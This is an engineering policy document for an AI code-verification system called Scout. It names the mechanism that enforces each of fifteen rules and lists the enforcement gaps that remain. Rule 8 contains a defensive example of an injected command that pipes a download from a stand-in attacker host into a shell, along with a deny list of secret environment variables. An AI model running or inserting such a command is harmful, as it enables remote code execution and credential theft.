# Scout Engineering Policies

Fifteen mandatory policies. A policy is enforced somewhere concrete or it is not a policy — each
rule below names the mechanism that enforces it in this codebase, or states plainly that enforcement
is currently review-only and what would make it mechanical.

Where a mechanism does not exist yet, the enforcement note says so and the missing mechanism is
listed in [§16 Enforcement gaps](#16-enforcement-gaps).

Related: [ARCHITECTURE.md](ARCHITECTURE.md) · [ROADMAP.md](ROADMAP.md) · [SECURITY.md](SECURITY.md) ·
[ADR 0002](adr/0002-shared-persistence-package.md) · [ADR 0003](adr/0003-evidence-versus-reasoning.md).

---

## Rule 1 — Do not introduce infrastructure before it is necessary.

**How this is enforced.** There is no message broker, no vector database, no service mesh, and no
container orchestrator in the dependency graph. The only backing services are PostgreSQL and Redis,
both already required for state and queueing (`SCOUT_DATABASE_URL`, `SCOUT_REDIS_URL` in
`.env.example`). Knowledge retrieval is designed to work without embeddings —
`KnowledgeDocument.embedding_id` is optional and keyword search must work without it (spec section
30). The only shared code package added beyond the app/package split is `scout-persistence`, and
[ADR 0002](adr/0002-shared-persistence-package.md) justifies it on the grounds that three processes
need one schema. `ApprovalGate` (spec section 77) encodes approval policy as data now so that
enforcement later is a configuration change rather than a new subsystem.

## Rule 2 — Every external integration must have an interface.

**How this is enforced.** Each external system sits behind a package with a substitutable
implementation, selected by configuration:

| Integration | Package | Interface boundary | Offline substitute |
|---|---|---|---|
| GitHub | `scout-github` | client protocol + webhook verification | in-memory fake, selected when `SCOUT_GITHUB_APP_ID` is blank |
| Model providers | `scout-llm` | provider-agnostic gateway | `SCOUT_LLM_DEFAULT_PROVIDER=fake` (the default) |
| Sandbox execution | `scout-sandbox` | `SandboxBackendKind` (`local`, `docker`) | local backend for development |
| Deterministic tools | `scout-tools` | registry + `ToolInvocation`/`ToolResult` contract | fake tool results in unit tests |
| Notifications | `scout-notifications` | `NotificationChannel` | disabled via `SCOUT_NOTIFICATIONS_ENABLED=false` (the default) |

No module outside `scout-github` may call the GitHub API, and no module outside `scout-llm` may call a
model provider. The default development configuration requires no external account at all.

## Rule 3 — Every agent must return structured output.

**How this is enforced.** `AgentResult` is a validated Pydantic model with `extra="forbid"`
(`ScoutModel`), so an unexpected field is a contract failure rather than a silently ignored key. Its
validator enforces status consistency: `needs_human` requires at least one `Question`; `failed` must
not report findings; `completed` is inconsistent with open questions. Role-specific structure travels
in `payload`, an explicit dictionary, so agents are never forced to smuggle structure through prose.
`AgentContext` pins the revision an agent analysed (`commit_sha` must equal `change_set.head_sha`) and
`AgentRun` records the prompt version, provider, model, token counts, and a context digest, so a
result can be reproduced rather than merely re-run.

## Rule 4 — Every tool execution must produce evidence.

**How this is enforced.** `ToolResult` requires an id, a job id, the tool name, the resolved command
and argv, start and completion timestamps, a duration, and a `ToolStatus`; a `PASSED` result with a
non-zero exit code is rejected by the validator. stdout, stderr, and machine-readable reports
(JUnit XML, SARIF) are captured as artifacts whose ids the result carries.
`scout_tools.artifacts.LocalArtifactStore` writes those bytes content-addressed under
`SCOUT_ARTIFACT_ROOT` and returns the `Artifact` metadata row the database stores, so the full output
is preserved while the database keeps only the locator. `ToolStatus.ERROR`/`TIMEOUT` are distinct
from `FAILED`, and `ToolResult.infrastructure_failure` marks a tooling problem so it cannot be
reported as a code defect or silently swallowed.

## Rule 5 — Every job must be resumable.

**How this is enforced.** No pipeline state lives only in memory.

- `JobStage` rows are append-only, one per attempt, with `outcome`, `attempt`, `skip_reason`, and
  artifact ids; a resolved stage (`SUCCEEDED` or `SKIPPED`) is durable evidence that it does not need
  to run again.
- `next_pipeline_stage(resolved_stages)` computes the first unresolved stage, and the state machine
  permits `QUEUED → <any stage>` whose predecessors are all resolved, so a restart never repeats
  completed work.
- `VerificationJob.lease_owner`/`lease_expires_at` with `lease_is_expired()` and `is_resumable`
  provide crash recovery: a job whose lease expired is reclaimed and resumed.
- `is_resumable` also governs the `FAILED → QUEUED` recovery edge.

Resumption is a domain invariant, not a convention: the forward guard refuses to enter a stage whose
predecessors are unresolved.

## Rule 6 — Every privileged action must be audited.

**How this is enforced.** `AuditEvent` records actor, actor type, dotted action, resource,
timestamp, correlation id, and job id. The action namespaces that must always be audited are listed
in `_PRIVILEGED_PREFIXES` — `approval`, `job`, `question`, `knowledge`, `repository`, `sandbox`,
`secret`, `policy`, `user`, `notification` — and `AuditEvent.is_privileged` classifies an event
against them. `audit_events` and the `AuditEvent` ↔ `AuditEventRow` mapping exist. `metadata` must
never contain secrets.

**Gap.** There is no `AuditRepository`, so nothing currently writes audit events and append-only is
enforced by the absence of a writer rather than by structure. Whoever adds it must expose no update
or delete operation, and that must be asserted by a test rather than by review — see
[SECURITY.md](SECURITY.md) §5.

## Rule 7 — No production credentials enter AI workers.

**How this is enforced.** Production credentials are not part of Scout's configuration surface:
`.env.example` defines Scout's own datastore, GitHub App, LLM, sandbox, notification, and
observability settings and nothing else. `AgentContext` has no credential field at all, by
construction. The AI worker holds only Scout-scoped credentials (its datastore access and the GitHub
App identity it needs to read the pull request and write a check run); it never receives credentials
for a deployed environment, because none exist in Scout. `.env.example` states the rule at the top of
the file: secrets are supplied through the environment, never through prompts, repository
configuration, or agent-visible context.

## Rule 8 — No repository code receives control-plane credentials.

**How this is enforced.** `SandboxPolicy.forbidden_environment` enumerates the control-plane variables
that must never be passed into a sandbox (`SCOUT_DATABASE_URL`, `SCOUT_REDIS_URL`,
`SCOUT_GITHUB_PRIVATE_KEY_PATH`, `SCOUT_GITHUB_WEBHOOK_SECRET`, the model-provider keys,
`SCOUT_SMTP_PASSWORD`, `SCOUT_GOOGLE_CHAT_WEBHOOK_URL`, and the AWS secret variables).
`scout_sandbox.command.build_minimal_environment()` constructs the environment from a fixed
passthrough allowlist (`PASSTHROUGH_ENVIRONMENT`) and raises `PolicyViolation` on any forbidden key;
`SandboxPolicy.assert_environment_is_safe()` re-checks the result, and the backend calls it
immediately before execution so the check cannot be forgotten at a call site. `allow_docker_socket`
and `allow_privileged` are rejected outright by the policy validator and re-checked by the Docker
backend before it builds its argument vector. That vector runs the container as uid 1000, with
`--read-only`, `--tmpfs /tmp:rw,noexec,nosuid,nodev`, `--cap-drop ALL`,
`--security-opt no-new-privileges`, and a single `--volume` mount of the workspace. `.scout/engineering.yaml`
commands are reduced to an argv vector and never passed to a shell, so
`pytest; curl evil.example | sh` is rejected at parse time rather than executed.

## Rule 9 — Do not make LLM output responsible for deterministic decisions.

**How this is enforced.** Model output is `EvidenceStrength.INFERENCE`, the lowest rank. A finding
whose strongest evidence is inference is capped at 0.65 confidence, is classified `AI_ONLY`, and can
never satisfy `is_verified_fact`. The recommendation is gated by recomputable facts, not by the
model: the `VerificationReport` validator rejects `PASS`/`PASS_WITH_WARNINGS` with open questions or
CRITICAL findings, rejects `PASS` with failed acceptance criteria or HIGH findings, and rejects
`PASS`/`PASS_WITH_WARNINGS` with failing tests. Risk is classified by path and content signals with an
explicit `RiskAssessment.explain()` rationale, never by a model. Job status is assigned only through
`assert_transition`, which consumes no model input. See
[ADR 0003](adr/0003-evidence-versus-reasoning.md).

## Rule 10 — Do not implement autonomous merging or deployment in the initial release.

**How this is enforced.** Structurally, not by policy statement. The `Capability` enum contains no
merge, push, approve, or deploy capability; `GITHUB_WRITE_CHECK` (a check run) is the only GitHub
write Scout has. `VERIFICATION_PIPELINE` contains no deployment stage. `Approval.decided_by_type`
must be `ActorType.HUMAN` — the validator rejects any other actor, so Scout cannot authorize its own
work. `ApprovalGate.blocking` defaults to `False`, so even the observe-only pilot cannot gate the
development process. The autonomous-remediation milestone is explicitly Not started in
[ROADMAP.md](ROADMAP.md) and requires a policy revision plus a new ADR before it may begin.

## Rule 11 — Tests must be written alongside implementation.

**How this is enforced.** pytest is configured with `--strict-markers --strict-config`, coverage is
branch-enabled over `packages` and `apps`, and the test taxonomy is declared as markers:
`integration`, `contract`, `e2e`, `sandbox`, `slow`. A test that uses an undeclared marker fails the
run rather than being silently ignored. CI (`.github/workflows/ci.yml`) runs the gate in order —
`ruff format --check`, `ruff check`, `mypy`, then unit+contract pytest, then an integration job with
real PostgreSQL and Redis service containers — and `make verify` reproduces the same gate locally.
Contract tests are the mechanism that keeps external payloads honest (`ScoutModel` uses
`extra="forbid"` for exactly this reason, spec section 56), and `tests/conftest.py` makes every run
hermetic by forcing offline defaults (`SCOUT_ENV=test`, `SCOUT_LLM_DEFAULT_PROVIDER=fake`,
`SCOUT_SANDBOX_BACKEND=local`, notifications and OTLP off) and redirecting artifact/workspace roots
into `tmp_path`. Two suites the design depends on are now real:
`test_every_evidence_kind_is_classified` (the totality check the `models/evidence.py` docstring
refers to by the stale name `test_evidence_strength_is_total`) and the report-gate tests in
`tests/unit/domain/test_report_and_models.py`. Still owed: a contract test comparing `TABLE_NAMES`
with `Base.metadata.tables`.

**Gap.** The harness is enforced and the domain tier is now tested — `tests/unit/domain/` contains
four modules covering the evidence/finding rules, report gates, the state machine, and risk and
configuration. The `contract`, `integration`, and `e2e` tiers are still empty, so the CI integration
job has nothing to run and the externally-facing contracts (GitHub payloads, model output) are not
yet pinned by a test. That is the substantive remaining part of this policy.

## Rule 12 — Do not hide failures behind generic exception handling.

**How this is enforced.** `scout_domain.errors` defines a named hierarchy — `ScoutDomainError`,
`InvalidJobTransition`, `TransitionGuardFailed`, `RepositoryConfigurationError`, `ConfigurationError`,
`PolicyViolation`, `ToolContractError` — so the orchestrator reasons about types rather than message
text. Retry classification is attached to the exception type
(`classify_exception` walks the MRO and reads a declared `failure_class`), and an unregistered
exception is `FailureClass.UNKNOWN`, which the policy treats as **non-retryable**: fail closed. A
failed job must record `failure_reason`; a failed stage must record `error`; a `ToolResult` with
`ERROR` must record an error message; a failed model request must record an error. Failure and
cancellation edges exist from every non-tombstone state precisely so that a crash or timeout is
representable rather than swallowed. Statically, ruff selects `TRY`, `B`, `PL`, and `LOG` rules and
mypy runs strict over `packages` and the three apps, both gated by `make verify` and CI.

## Rule 13 — Prefer explicit interfaces over framework magic.

**How this is enforced.** There is no dependency-injection framework, no plugin auto-discovery, and no
decorator-based routing. Interfaces are concrete and inspectable: Pydantic models at every boundary
with `extra="forbid"`; an explicit `Transition` table where every edge carries its guard and a
human-readable rationale; an explicit exception-type → `FailureClass` registry; explicit `Capability`
values passed in `AgentContext.capabilities` and checked by `AgentContext.requires()`; an explicit
tool registry; an explicit uv workspace where each package declares its own dependencies. Domain
objects are immutable values (`ScoutModel.evolve` returns a validated copy) rather than
framework-managed mutable entities.

## Rule 14 — Avoid premature microservices.

**How this is enforced.** One repository, one `uv` workspace, four deployable units
(`apps/api`, `apps/orchestrator`, `apps/worker`, `apps/dashboard`), one shared schema, one queue. The
Python processes communicate through PostgreSQL and Redis rather than through service-to-service RPC.
`scout-persistence` is a library, not a service: three processes depend on the same SQLAlchemy schema
and repositories, which is the opposite of splitting persistence per service. See
[ADR 0002](adr/0002-shared-persistence-package.md). The evolution path in
[ADR 0001](adr/0001-initial-hardware-target.md) (single machine → multiple workers → Linux server +
object storage → orchestration) adds capacity without changing the application's shape.

## Rule 15 — Preserve raw evidence.

**How this is enforced.** `Artifact` is content-addressed by SHA-256; identical output stored twice
costs one blob, and any finding can be traced to the exact bytes that produced it.
`scout_tools.artifacts` implements the store: `LocalArtifactStore` writes atomically to
`<root>/sha256/ab/cd/<digest>`, re-hashes on read to detect corruption (`get_bytes` raises on a digest
mismatch), exposes `verify`, and prunes by `expires_at` while respecting digests shared by several
rows; `InMemoryArtifactStore` keeps tests hermetic and `S3ArtifactStoreStub` reserves the Phase-3
object store behind the same `ArtifactStore` protocol. Raw output is never a database column:
`ToolResult` carries `stdout_artifact_id`, `stderr_artifact_id`, and `report_artifact_id`;
`ChangedFile` carries `patch_artifact_id`; `ChangeSet` carries `diff_artifact_id`; `AgentRun` carries
`result_artifact_id`; `JobStage` carries `artifact_ids`. `EvidenceReference.excerpt` is capped at
4 000 characters and is a pointer for the human reader, not storage. `DEFAULT_RETENTION` keeps
verification reports for seven years, most artifacts for one year, tool stdout/stderr for 90 days,
and logs for 30 days.

---

## 16. Enforcement gaps

Honest list of policies whose mechanism is currently review-only or not yet built. These are tracked
as M0 and M2 work in [ROADMAP.md](ROADMAP.md).

| Rule | Gap | Mechanised by |
|---|---|---|
| 1 | Nothing prevents a future dependency from being added; there is no dependency-policy check. | Review; optionally a CI allowlist check. |
| 2 | Interfaces exist throughout, and the sandbox backend factory, the fake GitHub client, and the fake LLM provider are implemented; what is missing is a protocol-conformance test proving each substitute satisfies its interface. | Contract tests in M3 and M9. |
| 3 | `AgentResult` and `AgentContext` are fully specified, but `scout-agents` is still unwritten, so no agent constructs one yet. | M7 and M10. |
| 4 | `ToolResult` is defined, `scout-tools` provides the registry, tool base, detection, and artifact store, and the sandbox captures streams — but no concrete tool (pytest, ruff, gitleaks) is registered and no caller turns a sandbox outcome into a `ToolResult` row. | M7 tool framework wiring and M8 tools. |
| 5 | Resumption is enforced by the state machine and the lease columns exist, but the queue and the reclaim sweep do not. | M5 queue/orchestrator. |
| 6 | `audit_events`, the mapping, and the append-only contract exist, but there is no `AuditRepository`, so append-only is enforced by the absence of a writer rather than by structure. | The audit repository must expose no update/delete operation, asserted by a test. |
| 11 | The harness is enforced (CI, `make verify`, hermetic `conftest.py`) and `tests/unit/domain/` covers the domain tier; `contract`, `integration`, and `e2e` are empty, and the `TABLE_NAMES` contract test is owed. | Contract and integration tests per milestone. |
| 15 | The content-addressed artifact store is implemented (`LocalArtifactStore`, `InMemoryArtifactStore`, `S3ArtifactStoreStub`) with digest verification and `prune_expired`; what is missing is a scheduled retention job and an access-control decision for stored bytes. | M7 wiring plus an operational retention job. |
| — | The whole tree does not currently pass `make lint` (ruff reported 108 errors across `packages/` and `apps/` at the time of writing), so the static gate exists but is red and cannot yet be relied on as a merge barrier. | The owning workstreams clear the backlog before M0 closes. |
| — | `migrations/` is empty: no `alembic.ini`, no `env.py`, no revision. `make migrate`, `make migration`, `make downgrade`, and `make db-reset` fail, CI's migration step is skipped by its own guard, and the schema has never been applied to a database. | M2 persistence. |
| — | `apps/orchestrator` and `apps/worker` contain only `__init__.py`, and `apps/api` has routers (`health`, `webhooks`) but no `main.py` application object. `make api`, `make orchestrator`, and `make worker` therefore fail and no process runs. | M0/M5/M6 process entry points. |
| — | There is no operator authentication or authorization model, and the API's job/question/approval read and write routes are unwritten, so the approval write path has no delivery mechanism. | M15, and an explicit auth design before it. |
| — | `scout_persistence/__init__.py`, `scout_llm/__init__.py`, and `scout_tools/__init__.py` are empty, so those packages have no declared public surface and callers import submodules directly. | Additive; a curated `__all__` per package. |
| — | The Compose `worker` service mounts `/var/run/docker.sock` so it can launch sandboxes; the socket is effectively host root. Bounded by repository code never running in the worker and by the sandbox policy refusing the socket, but it is a real residual risk. | A socket proxy or a rootless runtime on the Linux worker; see [SECURITY.md](SECURITY.md). |
